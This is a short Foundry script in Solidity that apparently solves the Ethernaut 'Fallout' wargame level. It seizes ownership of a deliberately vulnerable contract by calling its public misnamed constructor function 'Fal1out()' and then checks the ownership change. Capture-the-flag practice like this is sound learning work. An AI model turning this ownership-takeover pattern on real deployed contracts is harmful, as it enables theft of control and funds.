// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {Script,console} from "forge-std/Script.sol";
import "../src/Fallout.sol";

contract Solve is Script {
    Fallout public ethernaut2;
    address public addr = 0xA6Ac185a292E454E5D9A2b0116C5f5aaF562b2F2;
    function run() external {
        vm.startBroadcast();
        ethernaut2 = Fallout(addr);
        ethernaut2.Fal1out();
        require(msg.sender == ethernaut2.owner(), "steeling ownership failed!");
        vm.stopBroadcast();
    }
}

